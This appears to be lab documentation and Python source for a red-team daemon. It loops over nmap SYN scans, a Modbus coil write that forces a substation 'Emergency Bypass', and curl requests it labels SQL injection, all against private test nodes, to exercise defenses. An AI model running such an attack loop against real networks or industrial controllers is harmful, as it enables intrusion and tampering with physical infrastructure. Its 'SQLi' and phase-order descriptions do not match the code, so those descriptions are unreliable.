# Autonomous Adversary Daemon (`src/traffic/live_adversary_daemon.py`)

The `live_adversary_daemon.py` script runs continuously inside `sentinel-adversary`. It cycles through automated attack phases—interleaving reconnaissance sweeps, SCADA overrides, and API bursts—to continuously test edge defenses.

---

## 1. Automated Execution Loop

```text
 ┌─────────────────────────────────────────────────────────────┐
 │ PHASE 1: RECONNAISSANCE SWEEP                               │
 │  - Executes nmap -sS port discovery against all edge nodes  │
 └──────────────────────────────┬──────────────────────────────┘
                                │ Wait 10 Seconds
                                ▼
 ┌─────────────────────────────────────────────────────────────┐
 │ PHASE 2: SCADA COIL OVERRIDE BURST                          │
 │  - Executes mbpoll FC05 write against Substation (.101:502) │
 └──────────────────────────────┬──────────────────────────────┘
                                │ Wait 15 Seconds
                                ▼
 ┌─────────────────────────────────────────────────────────────┐
 │ PHASE 3: L7 WEB API EXPLOITATION                            │
 │  - Executes cURL SQL injection bursts against Web UI (8443) │
 └──────────────────────────────┬──────────────────────────────┘
                                │
                                └──► Repeats Cycle Continuously
```

---

## 2. Daemon Source Code (`live_adversary_daemon.py`)

```python
import subprocess
import time
import random
import sys

TARGET_NODES = ["10.240.0.101", "10.240.0.102", "10.240.0.103"]

def run_nmap_sweep():
    target = random.choice(TARGET_NODES)
    print(f"[*] [Adversary] Launching live nmap SYN sweep against {target}...")
    cmd = ["nmap", "-sS", "-Pn", "-p", "80,102,502,8443,20000", target]
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def run_mbpoll_override():
    target = "10.240.0.101" # Substation Alpha
    print(f"[*] [Adversary] Attempting malicious Modbus FC05 coil override on {target}:502...")
    # Attempt to write 1 to Coil 0 (Emergency Bypass)
    cmd = ["mbpoll", "-m", "tcp", "-a", "1", "-r", "1", "-0", "-1", target, "1"]
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def run_curl_sqli():
    target = "10.240.0.101"
    print(f"[*] [Adversary] Injecting SQLi payload via cURL against {target}:8443...")
    cmd = ["curl", "-k", "-s", f"https://{target}:8443/api/v1/telemetry?query=SELECT%20*%20FROM%20users"]
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():
    print("[*] Sentinel-Matrix Red-Team Adversary Node (10.240.0.99) Armed.")
    attacks = [run_nmap_sweep, run_mbpoll_override, run_curl_sqli]
    
    while True:
        attack_func = random.choice(attacks)
        try:
            attack_func()
        except Exception as e:
            print(f"[-] Execution fault: {e}", file=sys.stderr)
        
        # Jittered sleep interval
        time.sleep(random.uniform(5.0, 12.0))

if __name__ == "__main__":
    main()
```

